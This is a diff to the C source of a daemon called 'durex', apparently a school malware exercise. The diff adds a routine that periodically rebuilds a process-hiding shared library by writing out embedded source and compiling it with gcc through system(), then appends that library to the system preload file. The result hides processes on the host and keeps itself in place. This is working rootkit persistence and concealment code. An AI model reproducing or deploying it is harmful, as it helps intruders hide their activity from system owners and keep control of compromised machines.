@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2018/08/06 19:37:44 by root             ###   ########.fr       */
+/*   Updated: 2018/08/11 20:09:22 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,6 +20,11 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+/* getpwuid */
+#include <sys/types.h>
+#include <pwd.h>
+/* time */
+#include <time.h>
 
 #include "main.h"
 #include "durex.h"
@@ -76,6 +81,50 @@ static int			setupSelect()
 	return max;
 }
 
+static void		check_hide_binary()
+{
+	static time_t		t = 0;
+	struct stat	s;
+	int			fd;
+	size_t		ret;
+	FILE		*f;
+	char		*line;
+
+	if (time(NULL) - t > DUREX_PROCESSHIDER_CHECK_TIME) {
+		t = time(NULL);
+		if (stat(DUREX_PROCESSHIDER_LIB, &s) < 0) {
+			serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present. Recreating it...");
+			fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644);
+			if (fd < 0)
+				return ;
+			ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1);
+			close(fd);
+			if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1) {
+				remove(DUREX_PROCESSHIDER_FIL);
+				return ;
+			}
+			system("gcc -Wall -fPIC -shared -o "DUREX_PROCESSHIDER_LIB" "DUREX_PROCESSHIDER_FIL" -ldl");
+			remove(DUREX_PROCESSHIDER_FIL);
+		}
+		f = fopen(DUREX_PRELOAD, "a+");
+		if (f == NULL)
+			return ;
+		while (1) {
+			line = NULL;
+			ret = 0;
+			ssize_t ret2 = getline(&line, &ret, f);
+			if (ret2 <= 0)
+				break ;
+			if (strstr(line, DUREX_PROCESSHIDER_LIB))
+				return ; // lib in file, all OK !
+			free(line);
+		}
+		serverLog(e.server.reporter, DUREX_PROCESSHIDER_LIB" not present in "DUREX_PRELOAD". Fixing it!");
+		fwrite(DUREX_PROCESSHIDER_LIB, 1, sizeof(DUREX_PROCESSHIDER_LIB), f);
+		fclose(f);
+	}
+}
+
 void				durex()
 {
 	int				maxfd;
@@ -88,6 +137,7 @@ void				durex()
 		serverLog(e.server.reporter, "Reporter Hired.");
 		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
 		serverLog(e.server.reporter, "Server Opened.");
+		memset(&timeout, 0, sizeof(timeout));
 		while (1)
 		{
 			maxfd = setupSelect();
@@ -105,10 +155,15 @@ void				durex()
 				if (FD_ISSET(e.server.client[i].fd, &e.server.fdw))
 					serverWriteClient(&e.server.client[i]);
 			}
+			check_hide_binary();
 		}
+		quitClearlyServer();
+		quitClearlyDaemon();
 	}
-	quitClearlyServer();
-	quitClearlyDaemon();
+	struct passwd	*passwd;
+	passwd = getpwuid(getuid());
+	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
+	write(STDIN_FILENO, "\n", 1);
 }
 
 void			quitClearlyDaemon()
